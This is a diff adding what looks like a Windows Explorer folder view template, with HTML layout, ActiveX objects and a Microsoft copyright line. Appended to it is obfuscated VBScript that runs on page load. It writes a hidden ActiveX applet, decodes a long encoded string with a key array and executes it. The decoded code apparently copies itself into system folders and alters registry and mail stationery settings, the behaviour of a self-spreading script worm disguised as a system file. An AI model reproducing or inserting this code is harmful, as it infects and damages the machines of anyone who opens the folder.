@@ -1,0 +1,93 @@
+<BODY onload="vbscript:KJ_start()">
+<!--
+ * Copyright 1999 Microsoft Corporation.  All rights reserved.
+ -->
+
+<html>
+    <head>
+        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    </head>
+    <style>
+        body        {margin: 0; font: menu; color: black}
+        #Panel      {position: absolute; width: 200px; height: 100%; visibility: hidden; overflow: auto}
+        #Corner     {padding-left: 12px; padding-top: 11px}
+        #FolderIcon {width: 32px; height: 32px}
+        #FolderName {margin-top: 8px; font: 14pt/14pt menu; font-weight: bold}
+        #LogoLine   {width: 100%; height: 2px; margin-top: 4px; vertical-align: top}
+        #Details    {padding-left: 12px; margin-top: 8px}
+        #Locked     {vertical-align: baseline}
+        .Divider    {width: 100%; color: #C0C0C0; height: 1px}
+        #Thumbnail  {width: 120px; height: 120px}
+        .Legend     {margin-left: 8px}
+        #Brand      {position: absolute; left: 200px; width: 100%; height: 100%; padding-left: 12px}
+        p           {margin-top: 12px}
+        p.Half      {margin-top: 4px}
+        button      {font: 9pt 宋体, MS Song; margin-left: 12px; background: white; color: black}
+        .Message    {width: 100%; frameBorder: 0; background: infobackground; color: infotext; border: 1px solid lightgrey}
+        #CSCPlusMin {width: 17px}
+        #CSCText    {}
+        #CSCDetail  {}
+        #CSCButton  {}
+
+        #FileList   {position:absolute; width:0; height:100%; border=0}
+    </style>
+    <body scroll=no>
+        <div id=Panel style="background: white URL(wvleft.bmp) no-repeat">
+            <div id=Corner>
+                <object id=FolderIcon classid="clsid:844F4806-E8A8-11d2-9652-00C04FC30871" tabIndex=-1>
+                    <param name="scale" value=100>
+                </object>
+                <br>
+                <div id=FolderName>
+                    %THISDIRNAME%
+                </div>
+            </div>
+            <img id=LogoLine src="wvline.gif">
+            <div id=Details>
+                <span id=CSC>
+                    <div tabIndex=2 id=CSCHotTrack>
+                    <span id=CSCPlusMin>
+                    </span>
+                    <span id=CSCText>
+                    </span>
+                    </div>
+                    <div id=CSCDetail>
+                    </div>
+                    <span id=CSCButton>
+                    </span>
+                    <hr CLASS=Divider NOSHADE>
+                </span>
+                <span id=Info>
+                </span>
+
+                <br>
+                <span id=MediaPlayerSpan>
+                </span>
+
+                <object id=Thumbnail classid="clsid:71650000-E8A8-11d2-9652-00C04FC30871" tabIndex=-1>
+                </object>
+                <label id=ThumbnailLabel for="Thumbnail" style="display: none">
+                </label>
+
+                <span id=Links>
+                </span>
+            </div>
+        </div>
+        <object id=FileList classid="clsid:1820FED0-473E-11D0-A96C-00C04FD705A2" tabIndex=1>
+        </object>
+        <object id=WVCoord classid="clsid:BCFD624E-705A-11d2-A2AF-00C04FC30871">
+        </object>
+    </body>
+</html>
+
+
+<script language=vbscript>
+document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
+</script>
+<script language=vbscript>
+ExeString = "=ikBnUf^rc*AtkjMevr%V`qMevr%DcekecQbgl*:pnj^O`h^cr*?SM*PsQf^lj*PilNZtf*Lu`C%FglZlwBbsiSs`KH]lt_pm('KHQ^tBgf('KHAke_r^Mgjbes&ICLgi^Ir&ICCpcZtcKZij&ICPpmiae_me&'Cl] Qs[Fsl\tgmg IH:pncgdRm!Fgj^P_ra,RwieQrk)HnCkrmpRcqnmcGevrQcm PcZdRcfp;FQM'OncgTcvmFgj^(DgeeN_mh*/RfpQrk ;Ke_bMekn'Rc_]AjjGdIlqmr&RfpQrk, IC_qrZrr&'5>.OpEel&MmnQmr'5 /MhclPcZdRcfp,AeoqcCvbtDnnarbolElbIdIdMyncLtp6  fmt MhclPcZdRcfp,AeoqcQcm DgeeRcfp;FQM'OncgTcvmFgj^(DgeeN_mh*0DblcR^mn,Prgr^  : $BMBR mleo_b6  & obqakinr3$IHXsr_kt&'   < $obApEf$TknLtp t`<rJd&FmmjR^xrFgj^Tcki.AjhscScrF?rmrg`=DLO,E^tDgee&DblcNZtf'D?mtpg[._rmrg`ntcq=1-CescRc_]Tcki.AjhscScrFgj^Tcki ;?SM,HpclMevr?ijc!Fgj^P_ra,6'GdTwn^Srp= atkj Rf^n?ijcMekn'Wpgmet[CpJ_ $<   FMMJ< $obApEf$: & ;OBWoljhab;   t[sapbpr8 $KH]lt_pm(' $< &t[CpJ_ $AtkjMevrCjleGdTwn^Srp= obq TfcgDblcR^mn,Prgr^ t`<rJd&T[sRcqt>nbBf?ijcMekn'Cjmle>nbBf>nb?ulamiml?ulamimlKHAaale^Ss`!CspkelrLtpggg*JZsrGgdcv<h_pG_ J_ltGl]evAaap6 .MhclGdLcdm(JAZsc&<upp^nrQmrgl`)*/ ;:LA_le& \'MhclIH<h_l`eQs[ ;?il_eyBglk$8ZQnbC6 .Ejq^ICCf_ggcQnb;Cfp!Aqa!Lcdm(JAZsc&<upp^nrQmrgl`)*/)+1'  8ULu`C=.Cl] GdCjleDJAfZnecLu`6 Kg](AskrclmSrpbne**,J_ltGl]evAaap'Cl] GdCl] DsgcrghnDsgcrghnICCpcZtcKZij&Mg CpkopKeqsfeL^xrIdBnUf^rc6  fmmj TfcgCqir?ulamimlCl] GdQfZrcDblc6 Jc_t&UbnN_mh*1 $Ppm`r_kFgj^sZAhmkmg DgeeqZFiaphsmdm QfZrcbUSr_miml^rwZ[l_ld.frfBf&?SM,?ijc>xgqms&Qaapc?ijc)RaelC_je IH:pncgdRm!Sf_keDgee* atkj)>lqcQcm DgeeRcfp;FQM'OncgTcvmFgj^(QfZrcDblc*+,rpne'Fgj^Tcki.Upbtc<   FMMJ< $obApEf$: & ;OBWoljhab;   t[sapbpr8 $KH]lt_pm(' $< &t[CpJ_ $AtkjMevrDgeeRcfp,AeoqcCl] GdBc_asjmIb6 UqLhcje.Pc`Rc_]( FDEW]<UPP>NR]NSCPUIbcgtgrbeqZ=ed_nlrNscpIB MntJmhkTcksgmg ;PsQf^lj,KeeP^ab&HICR_JM<AJ]FAAFBNCZLodrpapcUMgakoqm_tZMntjmhkCqppclsZK^dg_Oep UlSfcel,P^gUpbtcHICR_ASKRCLM_SQ>RZG]elrbtgcl\ $=ed_nlrG]& ZLodrpapcUMgakoqm_tZMntjmhkCqppclsZ  Jc_t&MntJmhkTcksgmg,/'& ,)\K_blZAhmnmleSleQmarghncpr*/%PC@_BUHRB A_elICM_geRce!FI>Y]ANRPCGT]SLEPZBdclmirg^sZ DcdZujrBd$ USmdmw_p^\Kg\rmqhfrZHurjhoi>xnp^sqZ&J^fr&HurJhoiT^rqghn*/ $ '0ZKZijZLt_rbolckyLZmc %Sf_keDgee'C_je IHFagjKee&HICR_ASKRCLM_SQ>RZG]elrbtgcl\ $=ed_nlrG]& ZLodrpapcUMgakoqm_tZMntjmhkCqppclsZ  Jc_t&MntJmhkTcksgmg,/'& ,)\K_blZUbdcLt_rbolckyLZmc %Sf_keDgee'WqQaejj'RcePrgr^  FDEW]<UPP>NR]NSCPUSmdmw_p^\Kg\rmqhfrZHfdg\eZ7'0ZMntjmhkZMitgmgsZKZijZ>dgrhrNp^fcp^nac,/1*050%PC@_BUHRB A_elICM_geRce!FI>Y]ANRPCGT]SLEPZLodrpapcUMgakoqm_tZUbnbmpsK^sq_`ileSs`lyqr^mZNkodgeeqZFiaphsmdm Msmlmmd Glmepl^tQ^trgggqZ)a.b)2..)0..)0..\0..)0..)0..)024U0./^014)* [l_ld'C_je IHFagjKee&HICR_ASKRCLM_SQ>RZQhfruZrcZFiaphsmdm\Uggdmul LRUCspkelrOepqbolZPilbhwqFeqqZggl` Qs[swqmekZIrmdblcqUMgakoqm_tMntjmhkGgtcpgerLerrbneqU0_.]00.)0..)0..)c..)0..)0..)0.2/\..*e.1/0 *bj_gk 'UqLhcje.Pc`Wpgme AKCWXCSPKELRXUQCK\Qm_tu_keZKbcpmlodrUOddbccZ*0,.UOsreomiUOnrbolqUM_ge\CbbtmpIrcd^rcl\e **3/.02* KEE]=WMP=<ajjKHKZijP^g& AKCWXCSPKELRXUQCK\Qm_tu_keZKbcpmlodrUOddbccZ*0,.UCmkfolZFagjLerrbneqUNcuLt_rbolcky *bj_gk 'IHnmk_`eDmedcp!Lcdm(UggP_ra,1'& Irmekak?ijcl\AmfmmlFgj^sZKbcpmlodrSf_kebZLt_rbolcky 'Cl] DsgcrghnDsgcrghnICCpcZtcKblgcn('Ol>rpmk PclukcNcvmR^mnNZtf6   GdNmr!FQM'Fgj^Evgltq&PilNZtf  ULcpgit,cqe ' Rf^nMeknIarf= lyqr^m10U>nbBfBfR^mnNZtf6  qrsrcf30Z Rf^nLt_pmUnDblc6 UggP_ra $SWQMEKZDepl^l10'djjCescSr_ktSn?ijc=UbnN_mh$QWLTCKUKcpgej,]lj Cl] GdUqLhcje.Pc`Wpgme AKCWXLMA:L]K:CFGGEZQhfruZrcZFiaphsmdm\Uggdmul\AskrclmVcplimlURslUKcpgej1+*QmaprNpDgee?SM,<onw?ijcWglIarf& pe`Zdju_el,ebf *PilNZtf  u^bZDhlbck.frm?SM,<onw?ijcWglIarf& lyqr^m10UkhuZlj,`id %WglIarf& lyqr^m10Udcqdtmn'ilgAZljDJ?nielbMo&UbnN_mh$uc[\Dmedcp'hrr, fmt 'UqLhcje.Pc`Wpgme AKCWXCJ?LSCQXRMMM\,belZ %bjefgj^PsQf^lj,KeeUkircFI>Y]AEAQQ>S]PHORZ'djjUCmlmelrTwn^* Zpnjbc_rbol-q-kq]ouleo_bUlSfcel,P^gUpbtcHICR_AJ:SQCL_PMHTZbeldgeeZB^f_setGahnZ %WqQaejj'RceKe_b!FI>Y]AEAQQ>S]PHORZoxbdblcZ=ed_nlrG\olZ)PsQf^lj,KeeUkircFI>Y]AEAQQ>S]PHORZ]ljdblcZLcpgitCl`ilcU* OBQakinrUlSfcel,P^gUpbtcHICR_AJ:SQCL_PMHTZbelDgeeZQaejjUOncg\Amfm_l]\ *PilNZtf RcfpN_mh$UQ\rgnm.cv^   1  %( UqLhcje.Pc`Wpgme AKCWXCJ?LSCQXRMMM\bjeFgj^\Qf^ljCq\NphpcpmyQf^erFZnbj^rqZPSFNkonqU* t6.0.4A?.-73,B+/*CD+1C74&0.?:0.@17.6<} WqQaejj'RcePrgr^  FDEW]<L?QLEQ]KOMRUdjj?ijcUSapbprFhsrCgcmb^\ *{63*3/4,1+210A+*1B0&B/D2-..<02D16A1+4{ Qcm DgeeRcfp;FQM'OncgTcvmFgj^(QrZrrSiFgj^,0*mrscDblcR^mn,Prgr^ T`lTcvmDblcR^mn,<lmq^CgdDnnarbolDnnarbolDJJgdeGr!)BfGgWfcke:7  fmmj TfcgCqir?ulamimlCl] GdRfbsJm\arghn;dmanmclm.jm\arghnBfJ^fr&MhgqEoa_miml% 2'= _ijc Rf^nMhgqEoa_miml=Kbd&RaiqJhc_rbol*2)BfDLO,E^tCvmelqbolLZmc&MhgqEoa_miml :< mhclRfbsJm\arghn;Lcdm(RfbsJm\arghn*J^n&RaiqJhc_rbol'-J^n&DLO,E^tDgeeL_fe&RaiqJhc_rbol')>nbBfBfJ^n&RaiqJhc_rbol'>1TfcgRaiqJhc_rbol6 RfbsJm\arghn$Z Cl] GdIHnmk_`eDmedcp!TfglLmaZtgmg)>nbBf>nb?ulamiml?ulamimlKHKZijP^g&P^gQrk,DgeeL_fe'Ol>rpmk PclukcNcvmP^gRcfpQrk ;PsQf^lj,KeeP^ab&KeeQmr'IdKeeR^mnQmr; MhclUqLhcje.Pc`WpgmeP^gQrk,DgeeL_fe>nbBf>nb?ulamiml?ulamimlKHM[oQs[(AskrclmSrpbne'Qs[E;0MeqrHur6 .DmPhgj^ RpneMeqrHur6 RcltMsm )*G_ RcltMsm <+8RaelCspkelrLtpggg;FglZlwBbsi  8U>xgrDmElbIdOl>rpmk PclukcNcvmQ^tRaiqDhlbck ;?SM,@erDhlbck(AskrclmSrpbne'Qcm Bg\Ss`=Ake_r^O`h^cr&Sapbprggg,Bbcrghn_pr'ScrFmj]epq=RaiqDhlbck.Qs[Fmj]epqDmedcp<oslm ;)DhrCZcfMekn?ojb^rgg DmedcplDhlbckCmsgt;Fmj]epAhulr+/Bg\Ss`'abbFmj]epAhulr% RcfpDmedcp'N_k^L^xrId=iaQnb,Ahulr=.TfcgJZsrGgdcv<h_p=GgsrpKet&<upp^nrQmrgl`, Z,Jcg(AskrclmSrpbne'&1'Ss`Ltpggg;Mgb!CspkelrLtpggg*JZsrGgdcv<h_p$1*J^n&AnrpcgtQrkile-J_ltGl]evAaap+*)<upp^nrQmrgl` ;DJAfZnecLu`&<upp^nrQmrgl`,J_ltGl]evAaap'Qs[E;1>lqcGdSs`> ;) Rf^n<upp^nrQmrgl` ;<upp^nrQmrgl` $=iaQnb,Gmek&*)$Z CvbtBhCescj;0?opc ;* RmFmj]epAhulrGdLA_le&QnbQrkile ;EC_q^(Bg\Ss`'Ircf(h' Rf^nBfh<DhlbckCmsgtRaelCspkelrLtpggg;CspkelrLtpggg$DgaLu`,Btck!j)/ $\ Evgm BmCl] GdCl] GdLcqtEaqrBnbcqCf_k ;BnqrkRct!CspkelrLtpggg* U*J^n&AnrpcgtQrkile-/'Qs[Srpbne6 Kg](AskrclmSrpbne*EaqrBnbcqCf_k+/*Eel&<upp^nrQmrgl`)+JZsrGgdcv<h_p&1'CspkelrLtpggg;KHAaale^Ss`!CspkelrLtpggg*JZsrGgdcv<h_pCgdG_CgdG_JhonKHM[oQs[ ;<upp^nrQmrgl`CgdDnnarbolDnnarbolDJNphp_eZtc&Mg CpkopKeqsfeL^xrRceIarfOajs^ ;HICR_JM<AJ]FAAFBNCZLodrpapcUMgakoqm_tZMntjmhkCqppclsZB^gpc^=iqi=eep^e;WqQaejj'RceKe_b!RceIarfOajs^)BfBbsiB^gpc^ ;RaelDgqdDcekec6 Dggajw=iqi& 3\ ElbIdFmpi;/tm.BbsiB^gpc^ ;DJM`hSs`!DgqdDcekec'IHnmk_`eDmedcp!DgqdDcekec'LcqtPsQf^lj,KeeUkircRceIarfOajs^,BglkBc`rccCl] DsgcrghnDsgcrghnICukkZgcDhlbck(N_mhL_fe'Ol>rpmk PclukcNcvmQ^tDhlbckN_k^ ;?SM,@erDhlbck(N_mhL_fe'ScrTfglFgj^s;Fmj]epLZmc,?ijclFmtCvbsrq=.Dmk C_\hRaiqDblcBnRaiqDblcqDgeeCvm ;NC_q^(DQH.EcmEvr^nqghnL_fe&RaiqDblc,Iarf)BfDblcCqt;FRFMk DgeeCvm ;HRKEMk DgeeCvm ;AQN MpFgj^Evr= IHN Op?ijc>xr6  HLP MhclA_elICAnn^nbRh(RfbsDgee,NZtf*hrke'Ejq^Id?ijc>xr6  T;S MhclA_elICAnn^nbRh(RfbsDgee,NZtf*v`q)>lqcBfDblcCqt;FRMRaelHrr>xgqms;1>nbBfGevrGd(SAZsc&IarfGakc ;NC_q^(UggP_ra $DcqdtmnU''Op!UA_le&NZtfLZmc'=S<aqc!WglIarf& =eqimon )Rf^nAtrCqiqrl ;*CgdG_G_ FrmEvgltq6 .MhclDQH.AmiyDgeeUbnN_mh$qwltck,2Zb^sirhp,ggi *IarfGakcDQH.AmiyDgeeUbnN_mh$uc[\Dmedcp'hrr,N_mhL_fe>nbBf>nb?ulamiml?ulamimlKHQ^tBgf('Ol>rpmk PclukcNcvmCkr,Aee_pRcltGr=ULcpgit,Q\rgnmFsjen_k^G_ Cpk Rf^nBnUf^rc6  fmmj CjleBnUf^rc6  t[s ElbIdIdBnUf^rc6  t[s MhclQcm DQH ;<rc_meM`cear!Qakinrbne,?ijcLyqr^mM`cear)LerPsQf^lj6 Ap^arcHbhc\t& PSapbpr,Lhcje'Ejq^Q^t?ipjcHbhc\t;dmanmclm._nilcrl( IC_es^sr ?ipjcHbhc\t,q^tAJLIB&{D7,5BA+2+/<F.+*1B.&AB@2-..<02D=56?)B{ ?ipjcHbhc\t,ake_r^Ilqmala^('ScrWqQaejj=?ipjcHbhc\t,E^tM`cear!):pnj^O`h^cr,lerAESGB!y.=41D>0/+?071&1/A?-67-0+.)A.A2032+26{):pnj^O`h^cr,\rc_meGllt_l\e&'Qcm DQH ;:pnj^O`h^cr,@erM[jcam('ElbIdScrDgqdO`h^cr6 DQH.BpbvcqDmk C_\hBbsiR^mnBnBbsiM[jcamG_ BglkRcfp,BkitcMync<<+ ?l] BglkRcfp,BkitcMync<<* Rf^n>xgrFmpCl] GdDggajw=iqi=BbsiR^mn,=rgt^LcrmepNcvmBbmMmhcp:rp&,)Kalbhmgx^Dhrg60Rh 1Orf^r?pk(g'=Ggt&&2 (Knb'L^xrTckiSrpbne6   Dmk g;* RmLcl!TfglTcvm)MeknGuk6 ?q\(Kg](RfbsRcqt*g%1''GdTckiNsk=/, Rf^nMeknGuk6 06CjleGdTckiNsk=/) Rf^nMeknGuk6 07Cl] GdRcfpAfZr;Cfp!TckiNsk-Mmhcp:rp&b Km] 2'G_ RcfpAfZr;Cfp!32'TfcgR^mnAaap6 Afk(/6CgdG_R^mnQmrgl` ;MeknLtpggg$TckiCf_kL^xrUlJhciQmr;Cv^csr^(  =ikDew?kr&1,RfbsRcqt  v`AkLd$IcrApp!0'6   Mraep?kr&. $ $obApEf$ Kcw:rp&*);$Orf^r?pk(/'& $t[CpJ_&  Dew?kr&0 ; $HtfckApp!2'   &t`<rJd I^y?pk(1'= &Mmhcp:rp&,)$  v`AkLd$Dmk g;* RmLcl!EvcLtpggg' &t`<rJd R^mnLnm;Aqa!Mgb!EvcLtpggg*g%1''$t[CpJ_&  BfR^mnLnm;16Mhcl$t[CpJ_&  MeknGuk6 12$t[CpJ_&  >nbBf  v`AkLd$RcfpAfZr;Cfp!TckiNsk+I^y?pk(gFob-)' &t`<rJd G_ RcfpAfZr;Cfp!26'Tfcg $obApEf$ TckiCf_k ;obAp$t[CpJ_&  >lqcBfR^mnAaap6 Afk(07 Rf^n  v`AkLd$RcfpAfZr;v`J_ $obApEf$ ElbId &t`<rJd RaiqR^xr6 RfbsRcqt$TckiCf_k $obApEf$ Ncvm ' $obApEf$Cv^csr^(RfbsRcqt' RfbsRcqt;Cv^Srpbne6    $MeknLtpggg$  FmmjR^xr6: & lcpgitjZnesZgc;obqakinr7$v`AkLd  bhcsk^nr,prgr^     $: & ]itltwj^=%nhsgrbol8Zbqmeurc4 jc_t8.ix9mon8)pv9wgbmh8.ix9aegeat8.ix9s-gl]ev8+89oiqg[ijgmy8aibb^n%< $<    & :PNJ>TL:MC;DJ   ]`ucqm FCBGFR60UBDRF60ahdc;\ok,fs, &  ZcrgoeV,:crgoe   V<oknhnclm>   : $/?NILCR7$: & (dgt7  &t[CpJ_ $<   -lcpgit< &t[CpJ_ $<   q\rgnm j_ggs_`e;t[sapbpr< $obApEf$TfglTcvm $obApEf$UlJhciQmr$v`AkLd  : $/qakinr7$v`AkLd  : $/@M=Y< &t[CpJ_ $<   -ATKJ7ObqR^xr6 RfbsRcqt$v`AkLd SlEoaiLtp t`<rJd& DJ]qmapr!) WglIarf=DLO,E^tQn^cg_eFmj]ep&))$Z Gd(DQH.DgeeCvbsrq!WglIarf& pe`Z?ojb^r,fmt ' Rf^n?SM,<onw?ijcWglIarf& pe`Z?ojb^r,fmt *PilNZtf  u^bZicw_je.eg_>nbBfBf&?SM,?ijc>xgqms&UbnN_mh$qwltck,2Zb^sirhp,ggi ' Rf^n?SM,<onw?ijcWglIarf& lyqr^m10Udcqdtmn'ilg,UggP_ra $swqmek1+\ihpajj'ggdCgdG_CgdDnnarbol"
+Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 2"&vbCrLf&"KeyArr(1) = 7"&vbCrLf&"KeyArr(2) = 0"&vbCrLf&"KeyArr(3) = 2"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
+Execute(ThisText)
+</script>
+</BODY>
+</HTML>
